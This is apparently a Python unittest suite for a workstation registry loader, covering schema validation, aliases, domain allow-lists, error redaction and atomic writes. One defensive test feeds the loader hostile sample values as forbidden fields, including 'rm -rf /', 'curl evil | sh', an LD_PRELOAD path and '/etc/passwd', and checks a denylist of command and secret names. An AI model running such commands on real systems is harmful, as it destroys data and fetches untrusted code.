"""M2A: registry loading, validation, aliases, and atomic persistence.

Standard-library only, like the registry package itself, so these run on a bare
interpreter alongside the Trust Core suite as well as in the workstation job.

The properties pinned here are the ones that keep a *configuration file* from
becoming a *command channel* or a *secret store*: unknown and forbidden fields
fail, ambiguity fails, references must resolve, and nothing partially validated
reaches product logic.
"""

from __future__ import annotations

import json
import os
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from cofferdam.workstation.config import load_config
from cofferdam.workstation.registries import (
    FORBIDDEN_FIELDS,
    REGISTRY_NAMES,
    SUPPORTED_VERSION,
    is_valid_id,
    load_registries,
    normalize_alias,
    registry_document,
    write_json_atomic,
)
from cofferdam.workstation.registries import errors as reasons
from cofferdam.workstation.registries.storage import FILE_MODE

REPO_ROOT = Path(__file__).resolve().parents[1]
EXAMPLES = REPO_ROOT / "examples" / "registries"


def device(**overrides) -> dict:
    item = {
        "id": "ubuntu-workstation",
        "name": "Ubuntu workstation",
        "aliases": ["bilgisayar"],
        "enabled": True,
        "kind": "workstation",
        "platform": "linux",
        "notes": None,
    }
    item.update(overrides)
    return item


def display(**overrides) -> dict:
    item = {
        "id": "large-monitor",
        "device_id": "ubuntu-workstation",
        "name": "Büyük monitör",
        "aliases": ["büyük ekran"],
        "enabled": True,
        "match": {
            "connector_hint": "DP-1",
            "manufacturer": None,
            "model": None,
            "serial": None,
            "edid_sha256": None,
        },
    }
    item.update(overrides)
    return item


def application(**overrides) -> dict:
    item = {
        "id": "opera",
        "name": "Opera",
        "aliases": ["opera browser"],
        "enabled": True,
        "adapter_key": "opera",
    }
    item.update(overrides)
    return item


def browser_profile(**overrides) -> dict:
    item = {
        "id": "personal-opera",
        "name": "Kişisel Opera",
        "aliases": ["kişisel tarayıcı"],
        "enabled": True,
        "application_id": "opera",
        "default_for_url": True,
        "preferred_display_id": "large-monitor",
        "launch_mode": "default-instance",
        "domain_policy": {"mode": "allow-all", "domains": []},
    }
    item.update(overrides)
    return item


def agent_profile(**overrides) -> dict:
    item = {
        "id": "claude-code-cofferdam",
        "name": "Claude Code · Cofferdam",
        "aliases": ["cofferdam claude"],
        "enabled": True,
        "adapter_kind": "claude-code",
        "execution_status": "not-implemented",
    }
    item.update(overrides)
    return item


def conversation_route(**overrides) -> dict:
    item = {
        "id": "chatgpt-to-cofferdam-claude",
        "name": "ChatGPT → Cofferdam Claude",
        "aliases": ["bu chati yolla"],
        "enabled": True,
        "source_kind": "opera-extension",
        "target_agent_profile_id": "claude-code-cofferdam",
        "return_mode": "prepare-then-confirm",
    }
    item.update(overrides)
    return item


class RegistryTestCase(unittest.TestCase):
    """Each test gets its own COFFERDAM_HOME; nothing touches the real one."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.home = Path(self._tmp.name)
        self.config = load_config(home=self.home)
        self.config.ensure_dirs()

    def tearDown(self) -> None:
        self._tmp.cleanup()

    # -- helpers -------------------------------------------------------------

    def path(self, name: str) -> Path:
        return self.config.registry_path(name)

    def write(self, name: str, items, version: int = SUPPORTED_VERSION) -> None:
        self.path(name).write_text(
            json.dumps({"version": version, "items": items}, ensure_ascii=False),
            encoding="utf-8",
        )

    def write_raw(self, name: str, text: str) -> None:
        self.path(name).write_text(text, encoding="utf-8")

    def load(self):
        return load_registries(self.config)

    def assert_failure(self, name: str, reason: str):
        load = self.load().load(name)
        self.assertFalse(load.ok, f"{name} unexpectedly loaded")
        self.assertIsNone(load.registry, "a failed load must expose no items at all")
        self.assertEqual(load.error.reason, reason, load.error.describe())
        return load.error


# ---------------------------------------------------------------------------
# storage layout, defaults, envelope
# ---------------------------------------------------------------------------


class LayoutTests(RegistryTestCase):
    def test_registry_paths_live_under_config_registries(self) -> None:
        for name in REGISTRY_NAMES:
            with self.subTest(registry=name):
                self.assertEqual(
                    self.path(name), self.home / "config" / "registries" / f"{name}.json"
                )

    def test_ensure_dirs_creates_the_registry_directory(self) -> None:
        self.assertTrue(self.config.registries_dir.is_dir())


class EmptyAndMissingTests(RegistryTestCase):
    def test_missing_files_load_as_empty_valid_registries(self) -> None:
        """A machine that was never configured is not a machine in error."""
        registries = self.load()
        self.assertTrue(registries.ok)
        for name in REGISTRY_NAMES:
            with self.subTest(registry=name):
                registry = registries.require(name)
                self.assertEqual(registry.items, ())
                self.assertEqual(registry.version, SUPPORTED_VERSION)
                self.assertEqual(registry.source, "default")

    def test_explicitly_empty_registries_load(self) -> None:
        for name in REGISTRY_NAMES:
            self.write(name, [])
        registries = self.load()
        self.assertTrue(registries.ok)
        self.assertEqual(registries.require("devices").items, ())
        self.assertEqual(registries.require("devices").source, "file")

    def test_summary_reports_status_without_any_path(self) -> None:
        summaries = self.load().summary()
        self.assertEqual([s["name"] for s in summaries], list(REGISTRY_NAMES))
        blob = json.dumps(summaries)
        self.assertNotIn(str(self.home), blob)
        self.assertNotIn(".json", blob)
        self.assertNotIn("config/registries", blob)


class EnvelopeTests(RegistryTestCase):
    def test_malformed_json_fails_with_a_structured_error(self) -> None:
        self.write_raw("devices", "{not json")
        error = self.assert_failure("devices", reasons.INVALID_JSON)
        self.assertIn("not valid JSON", error.message)

    def test_malformed_json_is_never_rewritten(self) -> None:
        """A file we could not parse is the only record of what the user meant."""
        original = '{"version": 1, "items": [ oops'
        self.write_raw("devices", original)
        self.load()
        self.load()
        self.assertEqual(self.path("devices").read_text(encoding="utf-8"), original)

    def test_unknown_version_fails_closed(self) -> None:
        self.write("devices", [], version=2)
        error = self.assert_failure("devices", reasons.UNSUPPORTED_VERSION)
        self.assertEqual(error.where, "version")

    def test_version_must_be_an_integer_not_a_boolean(self) -> None:
        self.write_raw("devices", json.dumps({"version": True, "items": []}))
        self.assert_failure("devices", reasons.INVALID_VALUE)

    def test_unknown_top_level_field_fails(self) -> None:
        self.write_raw(
            "devices", json.dumps({"version": 1, "items": [], "extra": {"anything": 1}})
        )
        self.assert_failure("devices", reasons.UNKNOWN_FIELD)

    def test_top_level_must_be_an_object(self) -> None:
        self.write_raw("devices", json.dumps([device()]))
        self.assert_failure("devices", reasons.INVALID_ENVELOPE)

    def test_items_must_be_a_list(self) -> None:
        self.write_raw("devices", json.dumps({"version": 1, "items": {"a": 1}}))
        self.assert_failure("devices", reasons.INVALID_VALUE)


# ---------------------------------------------------------------------------
# item validation
# ---------------------------------------------------------------------------


class IdentifierTests(RegistryTestCase):
    def test_id_pattern(self) -> None:
        valid = ("a", "opera", "large-monitor", "pi-4b", "x1", "a-b-c")
        invalid = (
            "",
            "-leading",
            "trailing-",
            "double--dash",
            "Upper",
            "with space",
            "1-leading-digit",
            "under_score",
            "büyük",
            "dot.dot",
            "slash/slash",
            "a" * 65,
        )
        for candidate in valid:
            with self.subTest(id=candidate):
                self.assertTrue(is_valid_id(candidate))
        for candidate in invalid:
            with self.subTest(id=candidate):
                self.assertFalse(is_valid_id(candidate))

    def test_invalid_id_fails_validation(self) -> None:
        self.write("devices", [device(id="Ubuntu Workstation")])
        error = self.assert_failure("devices", reasons.INVALID_VALUE)
        self.assertEqual(error.where, "items[0].id")

    def test_duplicate_ids_fail(self) -> None:
        self.write("devices", [device(), device(name="Other", aliases=["ikinci"])])
        self.assert_failure("devices", reasons.DUPLICATE_ID)

    def test_ids_are_compared_exactly(self) -> None:
        self.write("devices", [device()])
        registry = self.load().require("devices")
        self.assertIsNotNone(registry.get("ubuntu-workstation"))
        for near_miss in ("Ubuntu-Workstation", " ubuntu-workstation", "ubuntu-workstation "):
            with self.subTest(candidate=near_miss):
                self.assertIsNone(registry.get(near_miss))


class UnknownAndForbiddenFieldTests(RegistryTestCase):
    def test_unknown_item_field_fails(self) -> None:
        self.write("devices", [device(colour="blue")])
        error = self.assert_failure("devices", reasons.UNKNOWN_FIELD)
        self.assertEqual(error.where, "items[0].colour")

    def test_forbidden_command_like_fields_are_refused_by_name(self) -> None:
        """(no arbitrary shell/executable/path entry through the new schemas)"""
        attempts = [
            ("devices", device, {"command": "rm -rf /"}),
            ("devices", device, {"argv": ["sh", "-c", "id"]}),
            ("devices", device, {"executable": "/bin/sh"}),
            ("devices", device, {"path": "/etc/passwd"}),
            ("devices", device, {"script": "curl evil | sh"}),
            ("devices", device, {"shell": True}),
            ("devices", device, {"env": {"LD_PRELOAD": "/tmp/x.so"}}),
            ("applications", application, {"executable_path": "/snap/bin/opera"}),
            ("applications", application, {"desktop_file": "/usr/share/applications/x.desktop"}),
            ("applications", application, {"args": ["--proxy-server=evil"]}),
            ("browser_profiles", browser_profile, {"user_data_dir": "/home/x/.config/opera"}),
            ("browser_profiles", browser_profile, {"profile_directory": "Default"}),
            ("browser_profiles", browser_profile, {"cookies": "session=abc"}),
            ("browser_profiles", browser_profile, {"password": "hunter2"}),
            ("agent_profiles", agent_profile, {"prompt": "do the thing"}),
            ("agent_profiles", agent_profile, {"api_key": "sk-test"}),
            ("agent_profiles", agent_profile, {"working_directory": "/home/x/project"}),
            ("conversation_routes", conversation_route, {"tab_id": "42"}),
            ("conversation_routes", conversation_route, {"conversation_id": "abc-123"}),
            ("conversation_routes", conversation_route, {"selector": "div.chat > p"}),
            ("conversation_routes", conversation_route, {"token": "secret"}),
        ]
        for name, factory, extra in attempts:
            with self.subTest(registry=name, field=sorted(extra)[0]):
                self._seed_dependencies(name)
                self.write(name, [factory(**extra)])
                self.assert_failure(name, reasons.FORBIDDEN_FIELD)

    def test_the_denylist_covers_the_obvious_command_and_secret_names(self) -> None:
        for name in ("command", "argv", "shell", "executable", "path", "script", "token", "cookies"):
            with self.subTest(field=name):
                self.assertIn(name, FORBIDDEN_FIELDS)

    def test_no_schema_field_collides_with_the_denylist(self) -> None:
        """The denylist must never shadow a field a registry legitimately uses."""
        used = set()
        for factory in (device, display, application, browser_profile, agent_profile, conversation_route):
            used.update(factory())
        self.assertEqual(used & FORBIDDEN_FIELDS, set())

    def _seed_dependencies(self, name: str) -> None:
        if name in ("browser_profiles",):
            self.write("applications", [application()])
            self.write("devices", [device()])
            self.write("displays", [display()])
        if name == "conversation_routes":
            self.write("agent_profiles", [agent_profile()])


# ---------------------------------------------------------------------------
# aliases
# ---------------------------------------------------------------------------


class AliasNormalizationTests(unittest.TestCase):
    def test_case_folding_and_whitespace(self) -> None:
        self.assertEqual(normalize_alias("  Ana   Bilgisayar  "), "ana bilgisayar")
        self.assertEqual(normalize_alias("OPERA"), "opera")

    def test_turkish_dotted_and_dotless_i(self) -> None:
        """ASCII lowering is wrong here, and plain casefold is not enough either."""
        self.assertEqual(normalize_alias("Büyük MONİTÖR"), normalize_alias("büyük monitör"))
        self.assertEqual(normalize_alias("IŞIK"), normalize_alias("ışık"))
        self.assertEqual(normalize_alias("İstanbul"), normalize_alias("istanbul"))

    def test_composed_and_decomposed_spellings_agree(self) -> None:
        import unicodedata

        composed = unicodedata.normalize("NFC", "büyük")
        decomposed = unicodedata.normalize("NFD", "büyük")
        self.assertNotEqual(composed, decomposed, "the fixture must actually differ")
        self.assertEqual(normalize_alias(composed), normalize_alias(decomposed))

    def test_display_text_is_never_mutated(self) -> None:
        original = "Büyük monitör"
        self.assertNotEqual(normalize_alias(original), original.upper())
        self.assertEqual(original, "Büyük monitör")


class AliasResolutionTests(RegistryTestCase):
    def setUp(self) -> None:
        super().setUp()
        self.write("devices", [device()])
        self.write("displays", [display(), display(id="laptop-panel", name="Laptop", aliases=["küçük ekran"])])

    def test_resolution_by_name_alias_and_id(self) -> None:
        registry = self.load().require("displays")
        for phrase in ("Büyük monitör", "BÜYÜK MONİTÖR", "  büyük   ekran ", "large-monitor"):
            with self.subTest(phrase=phrase):
                resolved = registry.resolve(phrase)
                self.assertIsNotNone(resolved, phrase)
                self.assertEqual(resolved.id, "large-monitor")

    def test_unknown_phrase_resolves_to_nothing(self) -> None:
        registry = self.load().require("displays")
        self.assertIsNone(registry.resolve("television"))

    def test_ids_win_over_aliases(self) -> None:
        """A precise reference cannot be hijacked by someone else's alias."""
        self.write(
            "displays",
            [
                display(),
                display(id="laptop-panel", name="laptop-panel-name", aliases=["large-monitor"]),
            ],
        )
        registry = self.load().require("displays")
        self.assertEqual(registry.resolve("large-monitor").id, "large-monitor")

    def test_duplicate_normalized_aliases_fail_validation(self) -> None:
        self.write(
            "displays",
            [
                display(),
                display(id="laptop-panel", name="Laptop", aliases=["BÜYÜK   EKRAN"]),
            ],
        )
        error = self.assert_failure("displays", reasons.DUPLICATE_ALIAS)
        self.assertIn("ambiguous", error.message)

    def test_an_alias_colliding_with_another_items_name_fails(self) -> None:
        self.write(
            "displays",
            [
                display(),
                display(id="laptop-panel", name="Laptop", aliases=["büyük monitör"]),
            ],
        )
        self.assert_failure("displays", reasons.DUPLICATE_ALIAS)

    def test_ambiguity_is_never_resolved_silently(self) -> None:
        """Even if validation were bypassed, the resolver refuses to choose."""
        registry = self.load().require("displays")
        registry._by_phrase[normalize_alias("shared")] = ("large-monitor", "laptop-panel")
        self.assertIsNone(registry.resolve("shared"))

    def test_blank_alias_fails(self) -> None:
        self.write("displays", [display(aliases=["   "])])
        self.assert_failure("displays", reasons.INVALID_VALUE)


# ---------------------------------------------------------------------------
# per-registry schemas
# ---------------------------------------------------------------------------


class DeviceSchemaTests(RegistryTestCase):
    def test_valid_device_loads(self) -> None:
        self.write("devices", [device()])
        item = self.load().require("devices").get("ubuntu-workstation")
        self.assertEqual((item.kind, item.platform, item.notes), ("workstation", "linux", None))

    def test_kind_and_platform_are_closed_vocabularies(self) -> None:
        for field, value in (("kind", "server"), ("platform", "freebsd")):
            with self.subTest(field=field):
                self.write("devices", [device(**{field: value})])
                error = self.assert_failure("devices", reasons.INVALID_VALUE)
                self.assertEqual(error.where, f"items[0].{field}")

    def test_notes_are_bounded_plain_text(self) -> None:
        self.write("devices", [device(notes="x" * 501)])
        self.assert_failure("devices", reasons.INVALID_VALUE)

    def test_notes_may_be_absent_or_null(self) -> None:
        item = device()
        del item["notes"]
        self.write("devices", [item])
        self.assertIsNone(self.load().require("devices").get("ubuntu-workstation").notes)


class DisplaySchemaTests(RegistryTestCase):
    def setUp(self) -> None:
        super().setUp()
        self.write("devices", [device()])

    def test_dangling_device_reference_fails(self) -> None:
        self.write("displays", [display(device_id="no-such-device")])
        error = self.assert_failure("displays", reasons.DANGLING_REFERENCE)
        self.assertEqual(error.where, "items[0].device_id")

    def test_a_disabled_device_may_still_own_a_display(self) -> None:
        self.write("devices", [device(enabled=False)])
        self.write("displays", [display()])
        self.assertTrue(self.load().load("displays").ok)

    def test_edid_hash_must_be_a_sha256_digest(self) -> None:
        for bad in ("deadbeef", "z" * 64, "0" * 63, "0" * 65, ""):
            with self.subTest(edid=bad):
                self.write("displays", [display(match={"edid_sha256": bad})])
                error = self.assert_failure("displays", reasons.INVALID_VALUE)
                self.assertEqual(error.where, "items[0].match.edid_sha256")

    def test_valid_edid_hash_is_stored_lowercased(self) -> None:
        self.write("displays", [display(match={"edid_sha256": "AB" * 32})])
        item = self.load().require("displays").get("large-monitor")
        self.assertEqual(item.match.edid_sha256, "ab" * 32)

    def test_match_is_optional(self) -> None:
        item = display()
        del item["match"]
        self.write("displays", [item])
        loaded = self.load().require("displays").get("large-monitor")
        self.assertIsNone(loaded.match.connector_hint)

    def test_unknown_match_field_fails(self) -> None:
        self.write("displays", [display(match={"connector_hint": "DP-1", "geometry": "1920x1080"})])
        self.assert_failure("displays", reasons.UNKNOWN_FIELD)


class ApplicationSchemaTests(RegistryTestCase):
    def test_adapter_key_is_a_closed_vocabulary(self) -> None:
        for bad in ("chrome", "opera-stable", "/snap/bin/opera", "OPERA"):
            with self.subTest(adapter_key=bad):
                self.write("applications", [application(adapter_key=bad)])
                self.assert_failure("applications", reasons.INVALID_VALUE)

    def test_both_supported_adapter_keys_load(self) -> None:
        self.write(
            "applications",
            [application(), application(id="firefox", name="Firefox", aliases=[], adapter_key="firefox")],
        )
        self.assertTrue(self.load().load("applications").ok)


class BrowserProfileSchemaTests(RegistryTestCase):
    def setUp(self) -> None:
        super().setUp()
        self.write("devices", [device()])
        self.write("displays", [display()])
        self.write(
            "applications",
            [application(), application(id="firefox", name="Firefox", aliases=[], adapter_key="firefox")],
        )

    def test_valid_profile_loads(self) -> None:
        self.write("browser_profiles", [browser_profile()])
        item = self.load().require("browser_profiles").get("personal-opera")
        self.assertEqual(item.application_id, "opera")
        self.assertEqual(item.preferred_display_id, "large-monitor")
        self.assertTrue(item.default_for_url)

    def test_application_must_exist_and_be_enabled(self) -> None:
        self.write("browser_profiles", [browser_profile(application_id="no-such-app")])
        self.assert_failure("browser_profiles", reasons.DANGLING_REFERENCE)

        self.write("applications", [application(enabled=False)])
        self.write("browser_profiles", [browser_profile()])
        self.assert_failure("browser_profiles", reasons.CONSTRAINT_VIOLATED)

    def test_preferred_display_must_reference_a_display(self) -> None:
        self.write("browser_profiles", [browser_profile(preferred_display_id="no-such-display")])
        self.assert_failure("browser_profiles", reasons.DANGLING_REFERENCE)

    def test_preferred_display_is_optional(self) -> None:
        self.write("browser_profiles", [browser_profile(preferred_display_id=None)])
        self.assertTrue(self.load().load("browser_profiles").ok)

    def test_launch_mode_is_restricted_to_default_instance(self) -> None:
        self.write("browser_profiles", [browser_profile(launch_mode="isolated-profile")])
        self.assert_failure("browser_profiles", reasons.INVALID_VALUE)

    def test_at_most_one_enabled_default_for_url(self) -> None:
        self.write(
            "browser_profiles",
            [
                browser_profile(),
                browser_profile(id="fallback-firefox", name="Yedek", aliases=[], application_id="firefox"),
            ],
        )
        error = self.assert_failure("browser_profiles", reasons.CONSTRAINT_VIOLATED)
        self.assertIn("default_for_url", error.where)

    def test_a_disabled_profile_may_keep_default_for_url(self) -> None:
        """Only *enabled* defaults compete; disabling one must not need an edit."""
        self.write(
            "browser_profiles",
            [
                browser_profile(),
                browser_profile(
                    id="fallback-firefox",
                    name="Yedek",
                    aliases=[],
                    application_id="firefox",
                    enabled=False,
                ),
            ],
        )
        self.assertTrue(self.load().load("browser_profiles").ok)

    def test_no_enabled_default_is_valid(self) -> None:
        self.write("browser_profiles", [browser_profile(default_for_url=False)])
        self.assertTrue(self.load().load("browser_profiles").ok)


class DomainPolicyTests(RegistryTestCase):
    def setUp(self) -> None:
        super().setUp()
        self.write("devices", [device()])
        self.write("displays", [display()])
        self.write("applications", [application()])

    def policy(self, policy: dict):
        self.write("browser_profiles", [browser_profile(domain_policy=policy)])
        return self.load().require("browser_profiles").get("personal-opera").domain_policy

    def test_allow_all_permits_every_host(self) -> None:
        policy = self.policy({"mode": "allow-all", "domains": []})
        for host in ("example.com", "badexample.com", "deep.sub.example.org"):
            with self.subTest(host=host):
                self.assertTrue(policy.allows(host))

    def test_allow_list_exact_host(self) -> None:
        policy = self.policy({"mode": "allow-list", "domains": ["example.com"]})
        self.assertTrue(policy.allows("example.com"))

    def test_allow_list_subdomain(self) -> None:
        policy = self.policy({"mode": "allow-list", "domains": ["example.com"]})
        for host in ("docs.example.com", "a.b.example.com"):
            with self.subTest(host=host):
                self.assertTrue(policy.allows(host))

    def test_allow_list_rejects_the_suffix_bypass(self) -> None:
        """The whole point of the boundary dot: badexample.com is not example.com."""
        policy = self.policy({"mode": "allow-list", "domains": ["example.com"]})
        for host in ("badexample.com", "notexample.com", "example.com.evil.net", "example.org"):
            with self.subTest(host=host):
                self.assertFalse(policy.allows(host))

    def test_allow_all_must_not_carry_domains(self) -> None:
        self.write(
            "browser_profiles",
            [browser_profile(domain_policy={"mode": "allow-all", "domains": ["example.com"]})],
        )
        self.assert_failure("browser_profiles", reasons.CONSTRAINT_VIOLATED)

    def test_allow_list_requires_at_least_one_domain(self) -> None:
        self.write(
            "browser_profiles", [browser_profile(domain_policy={"mode": "allow-list", "domains": []})]
        )
        self.assert_failure("browser_profiles", reasons.CONSTRAINT_VIOLATED)

    def test_unknown_mode_fails(self) -> None:
        self.write(
            "browser_profiles", [browser_profile(domain_policy={"mode": "deny-list", "domains": ["x.com"]})]
        )
        self.assert_failure("browser_profiles", reasons.INVALID_VALUE)

    def test_domain_entries_reject_schemes_paths_ports_wildcards_and_regex(self) -> None:
        rejected = [
            "https://example.com",
            "example.com/path",
            "example.com:8443",
            "user@example.com",
            "*.example.com",
            "exa?mple.com",
            "example",
            "-bad.com",
            "bad-.com",
            "exa mple.com",
            "under_score.com",
            "a" * 64 + ".com",
            "",
        ]
        for entry in rejected:
            with self.subTest(domain=entry):
                self.write(
                    "browser_profiles",
                    [browser_profile(domain_policy={"mode": "allow-list", "domains": [entry]})],
                )
                self.assert_failure("browser_profiles", reasons.INVALID_VALUE)

    def test_domains_are_lowercased_and_trailing_dots_dropped(self) -> None:
        policy = self.policy({"mode": "allow-list", "domains": ["Example.COM."]})
        self.assertEqual(policy.domains, ("example.com",))
        self.assertTrue(policy.allows("EXAMPLE.com"))


class AgentProfileTests(RegistryTestCase):
    def test_execution_status_may_only_be_not_implemented(self) -> None:
        """A registry cannot promote itself to a capability that does not exist."""
        for status in ("ready", "implemented", "running", "enabled", ""):
            with self.subTest(status=status):
                self.write("agent_profiles", [agent_profile(execution_status=status)])
                self.assert_failure("agent_profiles", reasons.INVALID_VALUE)

    def test_placeholder_profile_loads(self) -> None:
        self.write("agent_profiles", [agent_profile()])
        item = self.load().require("agent_profiles").get("claude-code-cofferdam")
        self.assertEqual(item.execution_status, "not-implemented")
        self.assertEqual(item.adapter_kind, "claude-code")

    def test_adapter_kind_is_a_closed_vocabulary(self) -> None:
        self.write("agent_profiles", [agent_profile(adapter_kind="subprocess")])
        self.assert_failure("agent_profiles", reasons.INVALID_VALUE)

    def test_every_shipped_example_agent_profile_is_a_placeholder(self) -> None:
        document = json.loads((EXAMPLES / "agent_profiles.json").read_text(encoding="utf-8"))
        for item in document["items"]:
            with self.subTest(agent=item["id"]):
                self.assertEqual(item["execution_status"], "not-implemented")


class ConversationRouteTests(RegistryTestCase):
    def setUp(self) -> None:
        super().setUp()
        self.write("agent_profiles", [agent_profile()])

    def test_template_loads(self) -> None:
        self.write("conversation_routes", [conversation_route()])
        item = self.load().require("conversation_routes").get("chatgpt-to-cofferdam-claude")
        self.assertEqual(item.return_mode, "prepare-then-confirm")

    def test_target_agent_profile_must_exist(self) -> None:
        self.write("conversation_routes", [conversation_route(target_agent_profile_id="nobody")])
        self.assert_failure("conversation_routes", reasons.DANGLING_REFERENCE)

    def test_source_kind_and_return_mode_are_closed_vocabularies(self) -> None:
        for field, value in (("source_kind", "chrome-extension"), ("return_mode", "auto-send")):
            with self.subTest(field=field):
                self.write("conversation_routes", [conversation_route(**{field: value})])
                self.assert_failure("conversation_routes", reasons.INVALID_VALUE)

    def test_routes_carry_no_live_conversation_state(self) -> None:
        """Templates, not records: nothing identifying a real conversation."""
        item = conversation_route()
        self.assertEqual(
            set(item),
            {"id", "name", "aliases", "enabled", "source_kind", "target_agent_profile_id", "return_mode"},
        )


# ---------------------------------------------------------------------------
# dependencies between registries
# ---------------------------------------------------------------------------


class DependencyTests(RegistryTestCase):
    def test_a_broken_dependency_invalidates_its_dependents(self) -> None:
        """Browser policy cannot be trusted while its applications are unreadable."""
        self.write_raw("applications", "{broken")
        self.write("devices", [device()])
        self.write("displays", [display()])
        self.write("browser_profiles", [browser_profile()])

        registries = self.load()
        self.assertFalse(registries.load("applications").ok)
        error = registries.load("browser_profiles").error
        self.assertEqual(error.reason, reasons.DEPENDENCY_INVALID)
        self.assertIsNone(registries.get("browser_profiles"))

    def test_independent_registries_still_load(self) -> None:
        self.write_raw("devices", "{broken")
        self.write("agent_profiles", [agent_profile()])
        registries = self.load()
        self.assertFalse(registries.load("devices").ok)
        self.assertTrue(registries.load("agent_profiles").ok)
        self.assertFalse(registries.ok)


# ---------------------------------------------------------------------------
# error redaction
# ---------------------------------------------------------------------------


class ErrorRedactionTests(RegistryTestCase):
    def test_errors_never_carry_paths_or_file_content(self) -> None:
        secret = "s3cr3t-token-value-do-not-leak"
        self.write_raw(
            "devices",
            json.dumps({"version": 1, "items": [device(notes=secret, colour=secret)]}),
        )
        error = self.load().load("devices").error
        described = error.describe() + json.dumps(error.to_payload())
        self.assertNotIn(secret, described)
        self.assertNotIn(str(self.home), described)
        self.assertNotIn(".json", described)

    def test_unreadable_file_reports_a_kind_not_a_trace(self) -> None:
        self.write("devices", [device()])
        with patch(
            "cofferdam.workstation.registries.loader.Path.read_text",
            side_effect=PermissionError(13, "Permission denied", str(self.path("devices"))),
        ):
            error = self.load().load("devices").error
        self.assertEqual(error.reason, reasons.UNREADABLE)
        self.assertNotIn(str(self.home), error.describe())

    def test_every_reason_is_in_the_closed_vocabulary(self) -> None:
        self.write_raw("devices", "{broken")
        self.assertIn(self.load().load("devices").error.reason, reasons.REASON_CODES)


# ---------------------------------------------------------------------------
# atomic persistence (no write API exists in M2A; the utility does)
# ---------------------------------------------------------------------------


class AtomicWriteTests(RegistryTestCase):
    def test_write_then_read_round_trips(self) -> None:
        target = self.path("devices")
        write_json_atomic(target, registry_document([device()]))
        self.assertTrue(self.load().load("devices").ok)
        self.assertEqual(self.load().require("devices").items[0].id, "ubuntu-workstation")

    def test_a_new_file_gets_restrictive_permissions(self) -> None:
        target = self.path("devices")
        write_json_atomic(target, registry_document([]))
        if os.name == "posix":
            self.assertEqual(target.stat().st_mode & 0o777, FILE_MODE & 0o777)

    def test_an_existing_files_permissions_are_preserved(self) -> None:
        target = self.path("devices")
        write_json_atomic(target, registry_document([]))
        if os.name != "posix":
            self.skipTest("POSIX permission semantics")
        os.chmod(target, 0o640)
        write_json_atomic(target, registry_document([device()]))
        self.assertEqual(target.stat().st_mode & 0o777, 0o640)

    def test_a_failed_replace_leaves_the_original_intact(self) -> None:
        target = self.path("devices")
        write_json_atomic(target, registry_document([device()]))
        original = target.read_text(encoding="utf-8")

        with patch(
            "cofferdam.workstation.registries.storage.os.replace",
            side_effect=OSError(28, "No space left on device"),
        ):
            with self.assertRaises(OSError):
                write_json_atomic(target, registry_document([device(id="replacement")]))

        self.assertEqual(target.read_text(encoding="utf-8"), original)
        self.assertTrue(self.load().load("devices").ok)

    def test_a_failed_write_leaves_no_temporary_file_behind(self) -> None:
        target = self.path("devices")
        with patch(
            "cofferdam.workstation.registries.storage.os.replace",
            side_effect=OSError(28, "No space left on device"),
        ):
            with self.assertRaises(OSError):
                write_json_atomic(target, registry_document([device()]))
        self.assertEqual(sorted(p.name for p in self.config.registries_dir.iterdir()), [])

    def test_an_unserializable_document_never_creates_a_file(self) -> None:
        target = self.path("devices")
        with self.assertRaises(TypeError):
            write_json_atomic(target, {"version": 1, "items": [{"id": object()}]})
        self.assertFalse(target.exists())
        self.assertEqual(sorted(p.name for p in self.config.registries_dir.iterdir()), [])


# ---------------------------------------------------------------------------
# the committed examples
# ---------------------------------------------------------------------------


class ShippedExampleTests(RegistryTestCase):
    def test_every_example_registry_validates(self) -> None:
        for name in REGISTRY_NAMES:
            source = EXAMPLES / f"{name}.json"
            self.assertTrue(source.is_file(), f"missing example: {source.name}")
            self.path(name).write_text(source.read_text(encoding="utf-8"), encoding="utf-8")
        registries = self.load()
        for name in REGISTRY_NAMES:
            with self.subTest(registry=name):
                load = registries.load(name)
                self.assertTrue(load.ok, load.error.describe() if load.error else "")
                self.assertTrue(load.registry.items, f"{name} example should not be empty")

    def test_examples_contain_no_personal_or_secret_material(self) -> None:
        forbidden_markers = (
            "100.",  # a Tailscale address
            "/home/",
            "@gmail",
            "token",
            "secret",
            "password",
            "cookie",
            "-----BEGIN",
        )
        for source in sorted(EXAMPLES.glob("*.json")):
            text = source.read_text(encoding="utf-8").lower()
            for marker in forbidden_markers:
                with self.subTest(example=source.name, marker=marker):
                    self.assertNotIn(marker.lower(), text)

    def test_examples_declare_the_supported_version(self) -> None:
        for source in sorted(EXAMPLES.glob("*.json")):
            with self.subTest(example=source.name):
                document = json.loads(source.read_text(encoding="utf-8"))
                self.assertEqual(document["version"], SUPPORTED_VERSION)


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
